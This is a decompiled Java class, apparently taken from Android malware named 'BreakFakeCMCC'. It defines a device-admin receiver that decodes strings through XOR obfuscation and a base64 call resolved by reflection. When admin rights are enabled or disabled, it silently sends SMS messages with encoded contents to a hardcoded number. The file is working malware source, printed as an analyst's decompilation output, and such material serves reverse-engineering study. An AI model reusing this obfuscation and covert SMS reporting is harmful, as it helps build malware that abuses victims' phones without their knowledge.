package hgfhh.hoip.cvxnbverw;

import android.annotation.SuppressLint;
import android.app.admin.DeviceAdminReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsManager;

@SuppressLint({"NewApi"})
public class FssAdmin extends DeviceAdminReceiver {
  private static String _1000cf8(String paramString) {
    // Byte code:
    //   0: aconst_null
    //   1: astore_1
    //   2: bipush #19
    //   4: newarray byte
    //   6: astore_2
    //   7: aload_2
    //   8: dup
    //   9: iconst_0
    //   10: ldc 123
    //   12: bastore
    //   13: dup
    //   14: iconst_1
    //   15: ldc 116
    //   17: bastore
    //   18: dup
    //   19: iconst_2
    //   20: ldc 126
    //   22: bastore
    //   23: dup
    //   24: iconst_3
    //   25: ldc 104
    //   27: bastore
    //   28: dup
    //   29: iconst_4
    //   30: ldc 117
    //   32: bastore
    //   33: dup
    //   34: iconst_5
    //   35: ldc 115
    //   37: bastore
    //   38: dup
    //   39: bipush #6
    //   41: ldc 126
    //   43: bastore
    //   44: dup
    //   45: bipush #7
    //   47: ldc 52
    //   49: bastore
    //   50: dup
    //   51: bipush #8
    //   53: ldc 111
    //   55: bastore
    //   56: dup
    //   57: bipush #9
    //   59: ldc 110
    //   61: bastore
    //   62: dup
    //   63: bipush #10
    //   65: ldc 115
    //   67: bastore
    //   68: dup
    //   69: bipush #11
    //   71: ldc 118
    //   73: bastore
    //   74: dup
    //   75: bipush #12
    //   77: ldc 52
    //   79: bastore
    //   80: dup
    //   81: bipush #13
    //   83: ldc 88
    //   85: bastore
    //   86: dup
    //   87: bipush #14
    //   89: ldc 123
    //   91: bastore
    //   92: dup
    //   93: bipush #15
    //   95: ldc 105
    //   97: bastore
    //   98: dup
    //   99: bipush #16
    //   101: ldc 127
    //   103: bastore
    //   104: dup
    //   105: bipush #17
    //   107: ldc 44
    //   109: bastore
    //   110: dup
    //   111: bipush #18
    //   113: ldc 46
    //   115: bastore
    //   116: pop
    //   117: aload_0
    //   118: iconst_0
    //   119: iconst_2
    //   120: invokevirtual substring : (II)Ljava/lang/String;
    //   123: astore_3
    //   124: new java/lang/StringBuilder
    //   127: dup
    //   128: aload_0
    //   129: aload_0
    //   130: invokevirtual length : ()I
    //   133: iconst_2
    //   134: isub
    //   135: invokevirtual substring : (I)Ljava/lang/String;
    //   138: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
    //   141: invokespecial <init> : (Ljava/lang/String;)V
    //   144: aload_0
    //   145: iconst_2
    //   146: aload_0
    //   147: invokevirtual length : ()I
    //   150: iconst_2
    //   151: isub
    //   152: invokevirtual substring : (II)Ljava/lang/String;
    //   155: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   158: aload_3
    //   159: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   162: invokevirtual toString : ()Ljava/lang/String;
    //   165: astore_0
    //   166: iconst_0
    //   167: istore #4
    //   169: iload #4
    //   171: bipush #19
    //   173: if_icmplt -> 440
    //   176: new java/lang/String
    //   179: dup
    //   180: aload_2
    //   181: invokespecial <init> : ([B)V
    //   184: astore_3
    //   185: new java/lang/StringBuilder
    //   188: dup
    //   189: aload_3
    //   190: iconst_2
    //   191: iconst_3
    //   192: invokevirtual substring : (II)Ljava/lang/String;
    //   195: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
    //   198: invokespecial <init> : (Ljava/lang/String;)V
    //   201: aload_3
    //   202: bipush #16
    //   204: bipush #17
    //   206: invokevirtual substring : (II)Ljava/lang/String;
    //   209: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   212: invokevirtual toString : ()Ljava/lang/String;
    //   215: astore_2
    //   216: new java/lang/StringBuilder
    //   219: dup
    //   220: new java/lang/StringBuilder
    //   223: dup
    //   224: new java/lang/StringBuilder
    //   227: dup
    //   228: aload_2
    //   229: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
    //   232: invokespecial <init> : (Ljava/lang/String;)V
    //   235: ldc 'c'
    //   237: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   240: invokevirtual toString : ()Ljava/lang/String;
    //   243: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
    //   246: invokespecial <init> : (Ljava/lang/String;)V
    //   249: aload_3
    //   250: iconst_4
    //   251: iconst_5
    //   252: invokevirtual substring : (II)Ljava/lang/String;
    //   255: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   258: invokevirtual toString : ()Ljava/lang/String;
    //   261: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
    //   264: invokespecial <init> : (Ljava/lang/String;)V
    //   267: aload_2
    //   268: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   271: invokevirtual toString : ()Ljava/lang/String;
    //   274: astore_2
    //   275: aload_3
    //   276: invokestatic forName : (Ljava/lang/String;)Ljava/lang/Class;
    //   279: astore_3
    //   280: aload_3
    //   281: aload_2
    //   282: iconst_2
    //   283: anewarray java/lang/Class
    //   286: dup
    //   287: iconst_0
    //   288: ldc java/lang/String
    //   290: aastore
    //   291: dup
    //   292: iconst_1
    //   293: getstatic java/lang/Integer.TYPE : Ljava/lang/Class;
    //   296: aastore
    //   297: invokevirtual getDeclaredMethod : (Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;
    //   300: aload_3
    //   301: iconst_2
    //   302: anewarray java/lang/Object
    //   305: dup
    //   306: iconst_0
    //   307: aload_0
    //   308: aastore
    //   309: dup
    //   310: iconst_1
    //   311: iconst_0
    //   312: invokestatic valueOf : (I)Ljava/lang/Integer;
    //   315: aastore
    //   316: invokevirtual invoke : (Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    //   319: checkcast [B
    //   322: astore_0
    //   323: aload_0
    //   324: arraylength
    //   325: istore #4
    //   327: iload #4
    //   329: iconst_1
    //   330: isub
    //   331: aload_0
    //   332: iload #4
    //   334: iconst_1
    //   335: isub
    //   336: baload
    //   337: i2c
    //   338: invokestatic valueOf : (C)Ljava/lang/String;
    //   341: invokestatic parseInt : (Ljava/lang/String;)I
    //   344: isub
    //   345: istore #4
    //   347: aload_0
    //   348: iload #4
    //   350: iconst_2
    //   351: isub
    //   352: baload
    //   353: i2c
    //   354: istore #5
    //   356: aload_0
    //   357: iload #4
    //   359: iconst_1
    //   360: isub
    //   361: baload
    //   362: i2c
    //   363: istore #6
    //   365: new java/lang/StringBuilder
    //   368: dup
    //   369: iload #5
    //   371: invokestatic valueOf : (C)Ljava/lang/String;
    //   374: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
    //   377: invokespecial <init> : (Ljava/lang/String;)V
    //   380: iload #6
    //   382: invokestatic valueOf : (C)Ljava/lang/String;
    //   385: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   388: invokevirtual toString : ()Ljava/lang/String;
    //   391: bipush #16
    //   393: invokestatic parseInt : (Ljava/lang/String;I)I
    //   396: i2b
    //   397: bipush #117
    //   399: isub
    //   400: i2b
    //   401: istore #7
    //   403: iload #4
    //   405: iconst_2
    //   406: isub
    //   407: istore #8
    //   409: ldc ''
    //   411: astore_1
    //   412: iload #8
    //   414: newarray byte
    //   416: astore_2
    //   417: iconst_0
    //   418: istore #4
    //   420: iload #4
    //   422: iload #8
    //   424: if_icmplt -> 509
    //   427: new java/lang/String
    //   430: astore_0
    //   431: aload_0
    //   432: aload_2
    //   433: ldc 'UTF-8'
    //   435: invokespecial <init> : ([BLjava/lang/String;)V
    //   438: aload_0
    //   439: areturn
    //   440: aload_2
    //   441: iload #4
    //   443: aload_2
    //   444: iload #4
    //   446: baload
    //   447: bipush #26
    //   449: ixor
    //   450: i2b
    //   451: i2b
    //   452: bastore
    //   453: iinc #4, 1
    //   456: goto -> 169
    //   459: astore_0
    //   460: aload_0
    //   461: invokevirtual printStackTrace : ()V
    //   464: aload_1
    //   465: astore_0
    //   466: goto -> 323
    //   469: astore_0
    //   470: aload_0
    //   471: invokevirtual printStackTrace : ()V
    //   474: aload_1
    //   475: astore_0
    //   476: goto -> 323
    //   479: astore_0
    //   480: aload_0
    //   481: invokevirtual printStackTrace : ()V
    //   484: aload_1
    //   485: astore_0
    //   486: goto -> 323
    //   489: astore_0
    //   490: aload_0
    //   491: invokevirtual printStackTrace : ()V
    //   494: aload_1
    //   495: astore_0
    //   496: goto -> 323
    //   499: astore_0
    //   500: aload_0
    //   501: invokevirtual printStackTrace : ()V
    //   504: aload_1
    //   505: astore_0
    //   506: goto -> 323
    //   509: aload_2
    //   510: iload #4
    //   512: aload_0
    //   513: iload #4
    //   515: baload
    //   516: iload #7
    //   518: ixor
    //   519: i2b
    //   520: i2b
    //   521: bastore
    //   522: iinc #4, 1
    //   525: goto -> 420
    //   528: astore_0
    //   529: aload_0
    //   530: invokevirtual printStackTrace : ()V
    //   533: aload_1
    //   534: astore_0
    //   535: goto -> 438
    // Exception table:
    //   from	to	target	type
    //   275	323	459	java/lang/ClassNotFoundException
    //   275	323	469	java/lang/IllegalAccessException
    //   275	323	479	java/lang/NoSuchMethodException
    //   275	323	489	java/lang/IllegalArgumentException
    //   275	323	499	java/lang/reflect/InvocationTargetException
    //   427	438	528	java/io/UnsupportedEncodingException
  }
  
  public void onDisabled(Context paramContext, Intent paramIntent) {
    SmsManager.getDefault().sendTextMessage(md.dh, null, _1000cf8("==ETWAcKWTMTVD8BVB4XWTEEVAEBMzHQfHSHNAVA"), null, null);
    super.onEnabled(paramContext, paramIntent);
    super.onDisabled(paramContext, paramIntent);
  }
  
  public void onEnabled(Context paramContext, Intent paramIntent) {
    SmsManager.getDefault().sendTextMessage(md.dh, null, _1000cf8("U=2PxJuWxZeSxp+gxpSbybiSxa2YyJ2dOTVRknNUYDyJ"), null, null);
    super.onEnabled(paramContext, paramIntent);
  }
}


/* Location:              /home/fahim/Desktop/BreakFakeCMCC-dex2jar.jar!/hgfhh/hoip/cvxnbverw/FssAdmin.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */